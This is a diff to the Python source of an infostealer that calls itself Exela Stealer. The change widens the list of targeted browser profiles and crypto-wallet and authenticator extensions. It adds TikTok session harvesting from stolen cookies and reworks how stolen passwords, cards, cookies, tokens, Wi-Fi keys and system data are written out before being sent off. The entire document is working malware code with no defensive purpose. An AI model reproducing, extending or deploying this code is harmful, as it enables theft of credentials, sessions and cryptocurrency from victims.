@@ -317,42 +317,68 @@ class Main:
         self.list_profiles()
         self.ListFirefoxProfiles()
         taskk = [
-            asyncio.create_task(self.GetPasswords()),
-            asyncio.create_task(self.GetCards()),
-            asyncio.create_task(self.GetCookies()),
-            asyncio.create_task(self.GetFirefoxCookies()),
-            asyncio.create_task(self.GetHistory()),
-            asyncio.create_task(self.GetFirefoxHistorys()),
-            asyncio.create_task(self.GetDownload()),
-            asyncio.create_task(self.GetBookMark()),
-            asyncio.create_task(self.GetAutoFill()),
-            asyncio.create_task(self.GetFirefoxAutoFills()),
-            asyncio.create_task(self.GetTokens()),
-            StealSystemInformation().FunctionRunner()
-            ]
+            asyncio.create_task(self.GetPasswords()), asyncio.create_task(self.GetCards()), asyncio.create_task(self.GetCookies()),
+            asyncio.create_task(self.GetFirefoxCookies()), asyncio.create_task(self.GetHistory()), asyncio.create_task(self.GetFirefoxHistorys()),
+            asyncio.create_task(self.GetDownload()), asyncio.create_task(self.GetBookMark()), asyncio.create_task(self.GetAutoFill()), 
+            asyncio.create_task(self.GetFirefoxAutoFills()), asyncio.create_task(self.GetTokens()), StealSystemInformation().FunctionRunner()]
+        
         await asyncio.gather(*taskk)
         await self.WriteToText()
         await self.SendAllData()
     def list_profiles(self) -> None:
         directorys = {
-            'Google Chrome' : os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
-            'Opera'  : os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
-            'Opera GX' : os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),    
-            'Brave' : os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
-            'Edge' : os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
-            'amigo': os.path.join(self.LocalAppData, "Amigo", "User Data"),
-            'torch': os.path.join(self.LocalAppData, "Torch", "User Data"),
-            'kometa': os.path.join(self.LocalAppData, "Kometa", "User Data"),
-            'orbitum': os.path.join(self.LocalAppData, "Orbitum", "User Data"),
-            'vivaldi': os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
-            'iridium': os.path.join(self.LocalAppData, "Iridium", "User Data"),
-            '7star': os.path.join(self.LocalAppData, "7Star", "7Star", "User Data"),
-            'uran': os.path.join(self.LocalAppData, "uCozMedia", "Uran", "User Data"),
-            'cent-browser': os.path.join(self.LocalAppData, "CentBrowser", "User Data"),
-            'sputnik': os.path.join(self.LocalAppData, "Sputnik", "Sputnik", "User Data"),
-            'yandex': os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data"),
-            'google-chrome-sxs': os.path.join(self.LocalAppData, "Google", "Chrome SxS", "User Data"),
-            'epic-privacy-browser': os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
+
+            "Pale Moon": os.path.join(self.RoamingAppData, "Moonchild Productions", "Pale Moon", "Profiles"),
+            "BlackHaw": os.path.join(self.RoamingAppData, "NETGATE Technologies", "BlackHaw", "Profiles"),
+            "Cyberfox": os.path.join(self.RoamingAppData, "8pecxstudios", "Cyberfox", "Profiles"),
+            "SeaMonkey": os.path.join(self.RoamingAppData,  "Mozilla", "SeaMonkey", "Profiles"),
+            "Opera GX": os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),
+            "IceDragon": os.path.join(self.RoamingAppData, "Comodo", "IceDragon", "Profiles"),
+            "Firefox": os.path.join(self.RoamingAppData, "Mozilla", "Firefox", "Profiles"),
+            "Opera": os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
+            "Thunderbird": os.path.join(self.RoamingAppData, "Thunderbird", "Profiles"),
+            "Waterfox": os.path.join(self.RoamingAppData, "Waterfox", "Profiles"),
+            "K-Meleon": os.path.join(self.RoamingAppData, "K-Meleon", "Profiles"),
+            "Mercury": os.path.join(self.RoamingAppData, "mercury", "Profiles"),
+
+            "amigo": os.path.join(self.LocalAppData, "Amigo", "User Data"),
+            "torch": os.path.join(self.LocalAppData, "Torch", "User Data"),
+            "Amigo": os.path.join(self.LocalAppData, "Amigo", "User Data"),
+            "Torch": os.path.join(self.LocalAppData, "Torch", "User Data"),
+            "kometa": os.path.join(self.LocalAppData, "Kometa", "User Data"),
+            "Liebao": os.path.join(self.LocalAppData, "liebao", "User Data"),
+            "Chedot": os.path.join(self.LocalAppData, "Chedot", "User Data"),
+            "orbitum": os.path.join(self.LocalAppData, "Orbitum", "User Data"),
+            "vivaldi": os.path.join(self.LocalAppData, "Vivaldi", "User Data"),
+            "iridium": os.path.join(self.LocalAppData, "Iridium", "User Data"),
+            "Slimjet": os.path.join(self.LocalAppData, "Slimjet", "User Data"),
+            "K-Melon": os.path.join(self.LocalAppData, "K-Melon", "User Data"),
+            "Thorium": os.path.join(self.LocalAppData, "Thorium", "User Data"),
+            "Chromium": os.path.join(self.LocalAppData, "Chromium", "User Data"),
+            "QIP Surf": os.path.join(self.LocalAppData, "QIP Surf", "User Data"),
+            "Maxthon": os.path.join(self.LocalAppData,  "Maxthon3", "User Data"),
+            "DCBrowser": os.path.join(self.LocalAppData, "DCBrowser", "User Data"),
+            "7star": os.path.join(self.LocalAppData, "7Star", "7Star", "User Data"),
+            "UR Browser": os.path.join(self.LocalAppData, "UR Browser", "User Data"),
+            "uran": os.path.join(self.LocalAppData, "uCozMedia", "Uran", "User Data"),
+            "CentBrowser": os.path.join(self.LocalAppData, "CentBrowser", "User Data"),
+            "Edge": os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
+            "Coowon": os.path.join(self.LocalAppData, "Coowon", "Coowon", "User Data"),
+            "Dragon": os.path.join(self.LocalAppData, "Comodo", "Dragon", "User Data"),
+            "CocCoc": os.path.join(self.LocalAppData, "CocCoc", "Browser", "User Data"),
+            "Elements": os.path.join(self.LocalAppData, "Elements Browser", "User Data"),
+            "Sputnik": os.path.join(self.LocalAppData, "Sputnik", "Sputnik", "User Data"),
+            "yandex": os.path.join(self.LocalAppData, "Yandex", "YandexBrowser", "User Data"),
+            "Google Chrome": os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
+            "Maple": os.path.join(self.LocalAppData, "MapleStudio", "ChromePlus", "User Data"),
+            "Catalina": os.path.join(self.LocalAppData, "CatalinaGroup", "Citrio", "User Data"),
+            "360Browser": os.path.join(self.LocalAppData, "360Browser", "Browser", "User Data"),
+            "Chrome (x86)": os.path.join(self.LocalAppData, "Google(x86)", "Chrome", "User Data"),
+            "Brave": os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
+            "google-chrome-sxs": os.path.join(self.LocalAppData, "Google", "Chrome SxS", "User Data"),
+            "epic-privacy-browser": os.path.join(self.LocalAppData, "Epic Privacy Browser", "User Data"),
+            "Fenrir": os.path.join(self.LocalAppData, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"),
+            
         }
         for junk, directory in directorys.items():
             if os.path.isdir(directory):
@@ -602,7 +628,76 @@ class Main:
                 "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                 "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                 "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
-                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",}
+                "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
+                "Bitapp": "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
+                "DAppPlay": "lodccjjbdhfakaekdiahmedfbieldgik",
+                "Equal": "blnieiiffboillknjnepogjhkgnoapac",
+                "Guild": "nanjmdknhkinifnkgdcggcfnhdaammmj",
+                "ICONex": "flpiciilemghbmfalicajoolhkkenfel",
+                "Math": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
+                "Mobox": "fcckkdbjnoikooededlapcalpionmalo",
+                "Sollet": "fhmfendgdocmcbmfikdcogofphimnkno",
+                "Slope": "pocmplpaccanhmnllbbkpgfliimjljgo",
+                "Starcoin": "mfhbebgoclkghebffdldpobeajmbecfk",
+                "HiroWallet": "ldinpeekobnhjjdofggfgjlcehhmanlj",
+                "MetaWallet": "bkklifkecemccedpkhcebagjpehhabfb",
+                "Swash": "cmndjbecilbocjfkibfbifhngkdmjgog",
+                "Finnie": "cjmkndjhnagcfbpiemnkdpomccnjblmj",
+                "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
+                "Crocobit": "pnlfjmlcjdjgkddecgincndfgegkecke",
+                "Oxygen": "fhilaheimglignddkjgofkcbgekhenbh",
+                "Nifty": "jbdaocneiiinmjbjlgalhcelgbejmnid",
+                "Liquality": "kpfopkelmapcoipemfendmdcghnegimn",
+                "Oasis": "ppdadbejkmjnefldpcdjhnkpbjkikoip",
+                "Temple": "ookjlbkiijinhpmnjffcofjonbfbgaoc",
+                "Pontem": "phkbamefinggmakgklpkljjmgibohnba",
+                "Solflare": "bhhhlbepdkbapadjdnnojkbgioiodbic",
+                "iWallet": "kncchdigobghenbbaddojjnnaogfppfj",
+                "OneKey": "jnmbobjmhlngoefaiojfljckilhhlhcj",
+                "HyconLiteClient": "bcopgchhojmggmffilplmbdicgaihlkp",
+                "Goby": "jnkelfanjkeadonecabehalmbgpfodjm",
+                "TezBox": "mnfifefkajgofkcjkemidiaecocnkjeh",
+                "ONTOWallet": "ifckdpamphokdglkkdomedpdegcjhjdp",
+                "Hashpack": "gjagmgiddbbciopjhllkdnddhcglnemk",
+                "Cyano": "dkdedlpgdmmkkfjabffeganieamfklkm",
+                "SenderWallet": "epapihdplajcdnnkdeiahlgigofloibg",
+                "Zecrey": "ojbpcbinjmochkhelkflddfnmcceomdi",
+                "Auro": "cnmamaachppnkjgnildpdmkaakejnhae",
+                "Rabby": "acmacodkjbdgmoleebolmdjonilkdbch",
+                "NeoLine": "cphhlgmgameodnhkjdmkpanlelnlohao",
+                "Nabox": "nknhiehlklippafakaeklbeglecifhad",
+                "KHC": "hcflpincpppdclinealmandijcmnkbgn",
+                "CLW": "nhnkbkgjikgcigadomkphalanndcapjk",
+                "Polymesh": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
+                "ZilPay": "klnaejjgbibmhlephnhpmaofohgkpgkd",
+                "Byone": "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
+                "Eternl": "kmhcihpebfmpgmihbkipmjlmmioameka",
+                "MaiarDeFiWallet": "dngmlblcodfobpdpecaadgfbcggfjfnm",
+                "LeafWallet": "cihmoadaighcejopammfbmddcmdekcje",
+                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
+                "BraveWallet": "odbfpeeihdkbihmopkbjmoonfanlbfcl",
+                "MEWCX": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
+                "Flint": "hnhobjmcibchnmglfbldbfabcgaknlkj",
+                "CardWallet": "apnehcjmnengpnmccpaibjmhhoadaico",
+                "CryptoAirdrop": "dhgnlgphgchebgoemcjekedjjbifijid",
+                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
+                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
+                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
+                "BoltX": "aodkkagnadcbobfpggfnjeongemjbjca",
+                "Core": "agoakfejjabomempkjlepdflaleeobhb",
+                "Ever": "cgeeodpfagjceefieflmdfphplkenlfk",
+                "Fewcha": "ebfidpplhabeedpnhjnobghokpiioolj",
+                "Guarda": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
+                "Jaxx Liberty": "cjelfplplebdjjenllpjcblmjkfcffne",
+                "Kaikas": "jblndlipeogpafnldhgmapagcccfchpi",
+                "PaliWallet": "mgffkfbidihjpoaomajlbgchddlicgpn",
+                "Petra": "ejjladinnckdgjemekebdpeokbikhfci",
+                "Safepal": "lgmpcpglpngdoalbgeoldeajfclnhafa",
+                "Saturn": "nkddgncdjgjfcddamfgcmfnlhccnimig",
+                "Tokenpocket": "mfgccjchihfkkindfppnaooecgfneiii",
+                "XMR.PT": "eigblbgjknlfbajkfhopmcojidlgcehm",
+                "XinPay": "bocpokimicclpaiekenaeelehdjllofo",
+                }
             wallet_local_paths = {
                 "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                 "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
@@ -794,7 +889,8 @@ class Main:
             pass
     async def RiotGamesSession(self, cookie, browser:str) -> None:
         try:
-            response = requests.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}).json()
+            url = 'https://account.riotgames.com/api/account/v1/user'
+            response = requests.get(url, headers={"Cookie": f"sid={cookie}"}).json()
 
             username = response['username']
             email = response['email']
@@ -817,11 +913,14 @@ class Main:
                     "cookie": f"sessionid={cookie}"
                 }
             
-            data = requests.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers=headers).json()
-            data2 = requests.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/", headers=headers).json() 
+            url = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
+            url2 = f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"
 
+            data = requests.get(url, headers=headers).json()
+            data2 = requests.get(url2, headers=headers).json()
+            
             username = data["user"]["username"]
-            profileURL = "https://instagram.com/" + username
+            profileURL = f"https://instagram.com/{username}"
 
             if data["user"]["biography"] == "":
                 bio = "No bio"
@@ -837,6 +936,7 @@ class Main:
             verify = str(data["user"]["is_verified"])
             followers = str(data2["user"]["follower_count"])
             following = str(data2["user"]["following_count"])
+            
 
             
         except Exception as e:
@@ -870,11 +970,21 @@ class Main:
             username = data["data"]["username"]
             coins = str(data2["data"]["coins"])
             profileUrl = f'https://tiktok.com/@{username}'
+            uid = data["data"]["sec_user_id"]
+            timestamp = data["data"]["create_time"]
+            formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
+            try:
+                url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
+                data3 = requests.get(url3, headers=headers, cookies=cookies).json()
+                subscriber = data3["total"]
+            except Exception as e:
+                error_Handler(e)
+                subscriber = "0"
 
         except:
             pass
         else:
-            Variables.TikTokAccounts.append(f"Browser Name: {browser}\nProfile URL: {profileUrl}\nCookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n======================================================================\n")
+            Variables.TikTokAccounts.append(f"Browser Name: {browser}\nProfile URL: {profileUrl}\nCookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{username}\nUsername : {username}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\nSuscriber! {subscriber}\nCreated Date: {formatted_date}\n======================================================================\n")
 
     async def TwitterSession(self, cookie, browser:str) -> None:
         try:
@@ -995,6 +1105,7 @@ class Main:
             current_timestamp = time.time()
             timestamp = current_timestamp - (age * 24 * 60 * 60)
             date = time.strftime("%Y-%m-%d", time.localtime(timestamp))
+            
 
         except:
             pass
@@ -1181,7 +1292,7 @@ class Main:
                                             continue
         except:
             pass
-# un peu de wasp stealer rajouter ici.
+
     async def ValidateTokenAndGetInfo(self, token:str) -> None:
         try:
             baddglist = [
@@ -1394,143 +1505,137 @@ class Main:
             reddit_acc = Variables.RedditAccounts
             twitch_acc = Variables.TwtichAccounts
             spotify_acc = Variables.SpotifyAccounts
-            steam_acc = Variables.SteamAccounts
             roblox_acc = Variables.RobloxAccounts
 
             processList = Variables.Processes
             if processList:
                 with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for proc in processList:
                         file.write(proc)
             if Variables.ClipBoard:
                 with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for lstclip in Variables.ClipBoard:
                         file.write(lstclip)
             if self.FirefoxCookieList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for fcookie in self.FirefoxCookieList:
                         file.write(fcookie)
             if self.FirefoxHistoryList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for fhistory in self.FirefoxHistoryList:
                         file.write(fhistory)
             if self.FirefoxAutofiList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for fautofill in self.FirefoxAutofiList:
                         file.write(fautofill)
             if password_list:
                 with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for passwords in password_list:
                         file.write(passwords)
             if card_list:
                 with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for cards in card_list:
                         file.write(cards)
             if cookie_list:
                 with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for cookies in cookie_list:
                         file.write(cookies)
             if history_list:
                 with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for historys in history_list:
                         file.write(historys)
             if autofill_list:
                 with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for autofill in autofill_list:
                         file.write(autofill)
             if bookmark_list:
                 with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for bookmark in bookmark_list:
                         file.write(bookmark)           
             if download_list:
                 with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for downloads in download_list:
                         file.write(downloads)
             if riot_acc:
                 with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for riotgames in riot_acc:
                         file.write(riotgames)
             if insta_acc:
                 with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for insta in insta_acc:
                         file.write(insta)
             if tiktok_acc:
                 with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for tiktok in tiktok_acc:
                         file.write(tiktok)
             if twitter_acc:
                 with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for twitter in twitter_acc:
                         file.write(twitter)
             if reddit_acc:
                 with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for reddit in reddit_acc:
                         file.write(reddit)
             if twitch_acc:
                 with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for twitch in twitch_acc:
                         file.write(twitch)
             if spotify_acc:
                 with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for spotify in spotify_acc:
                         file.write(spotify)
             if roblox_acc:
                 with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for roblox in roblox_acc:
                         file.write(roblox)
-            if steam_acc:
-                with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
-                    for steam in steam_acc:
-                        file.write(steam)
             if Variables.DiscordAccounts:
                 with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for discord in Variables.DiscordAccounts:
                         file.write(discord)
             if Variables.FullTokens:
                 with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for token in Variables.FullTokens:
                         file.write(token + "\n")    
             if Variables.ValidatedTokens:
                 with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for validated_token in Variables.ValidatedTokens:
                         file.write(validated_token + "\n")   
             if Variables.Wifis:
                 with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for profile_name, profile_password in Variables.Wifis:
                         file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
             if Variables.SystemInfo:
                 with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for sysmteminfo in Variables.SystemInfo:
                         file.write(str(sysmteminfo))
             if Variables.Network:
                 with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("---------------------------------------------------------------------\n"+ "=" * 70 + "\n")
+                    file.write("=" * 70 + "\n")
                     for ip, country, city, timezone, isp, proxy in Variables.Network:
                         file.write(f"IP Adress: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp}\nProxy: {proxy}") 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
@@ -1641,7 +1746,6 @@ class Main:
 <b>Spotify</b> <code>{str(len(Variables.SpotifyAccounts))}</code>
 <b>Riot Game's</b> <code>{str(len(Variables.RiotGameAccounts))}</code>
 <b>Roblox</b> <code>{str(len(Variables.RobloxAccounts))}</code>
-<b>Steam</b> <code>{str(len(Variables.SteamAccounts))}</code>
 
 <b>👤 <i><u>About - https://t.me/Exela_Stealer</u></i></b>
 """
